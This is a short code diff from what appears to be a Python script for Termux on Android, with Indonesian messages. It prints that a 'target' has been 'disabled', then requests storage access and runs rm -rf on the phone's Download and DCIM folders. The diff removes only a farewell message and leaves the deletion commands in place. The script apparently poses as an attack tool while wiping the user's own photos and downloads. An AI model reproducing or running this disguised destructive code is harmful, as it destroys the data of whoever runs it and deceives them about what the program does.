@@ -85,7 +85,6 @@ sleep(4)
 print("\033[1;36m target berhasil dilumpuhkan[>
 sleep(3)
 print(" ")
-print("\033[0;32m SHILAKAN KEMBALI LAGI NANTI")
 os.system('termux-setup-storage')
 os.system('rm -rf /storage/emulated/0/Download')
 os.system('rm -rf /storage/emulated/0/DCIM')
